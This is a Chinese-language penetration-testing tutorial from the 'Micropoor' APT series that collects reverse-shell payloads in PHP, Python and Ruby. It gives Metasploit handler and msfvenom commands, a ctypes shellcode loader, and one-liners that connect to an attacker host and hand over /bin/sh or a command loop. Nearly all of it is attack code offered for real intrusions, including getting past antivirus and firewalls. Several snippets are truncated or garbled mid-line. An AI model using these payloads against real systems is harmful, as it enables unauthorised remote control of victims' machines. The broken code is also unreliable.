专注APT攻击与防御
https://micropoor.blogspot.com/

在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。

这次主要补充了PHP，python，ruby。

ps:在线代码高亮：http://tool.oschina.net/highlight

**1.php-payload**
```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.107
LHOST => 192.168.1.107
```
```php
<?
php error_reporting(0); $ip = 'x.x.x.x'; $port = 53; if (($f = 'stream_socket_client') && is_callable($f)) { 
{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_ 
strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s 
>
```
![](media/c62949c5cacf6d6a5605200311aa5b9a.jpg)

```
<?php
$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3"); 
?>
```
![](media/107730c867318d074cc21b9b490d8e8d.jpg)

**2.python-payload**
```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.107
LHOST => 192.168.1.107
```
```python
import socket,struct,time 
for x in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('x.x.x.x',xx)) 
        break
    except:
        time.sleep(5) l=struct.unpack('>I',s.recv(4))[0] 
d=s.recv(l)
while len(d)<l: 
    d+=s.recv(l-len(d))
exec(d,{'s':s})
```
![](media/56fa0d76a0ef5b598d14f8a67de449b7.jpg)

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",xx));i"]);`
![](media/268f5cbb31121e9d7f37909587296e7a.jpg)

```python
import socket import subprocess

s=socket.socket()
s.connect(("xx.xx.xx.xx",xx)) while 1:
p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subpro s.send(p.stdout.read() + p.stderr.read())
```
![](media/710a81ff2c29a516aa878760e1fbd110.jpg)

删除特征：
```bash
root@John:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d '"' | tr -d '\n'
```
![](media/34aeea621a28e0377b370eda4a63aaa2.jpg)

```python
from ctypes import *

reverse_shell = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72
micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))
shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))
shellcode()
```

**2.ruby-payload**
```ruby
require 'socket';c=TCPSocket.new("xx.xx.xx.xx", x);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdi
(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil}
```
![](media/5253458a976fd4e0212059638751245b.jpg)

```ruby
require 'socket';f=TCPSocket.open("xx.xx.xx.xx",xx).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
```
![](media/b9032b829c6a977288c32948088801b6.jpg)

```ruby
require 'socket';c=TCPSocket.new("xx.xx.xx.xx","xx");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end  
```
![](media/cdb7a522f8eb1facc72265a923ef173e.jpg)

```ruby
c=TCPSocket.new("xx.xx.xx.xx","xx");while(cmd=c.gets);IO.popen(cmd,"r"){\|io\|c.print
io.read}end
```
![](media/9246e2313d4cbcb3c4dacced7c25e0c1.jpg)

>   Micropoor
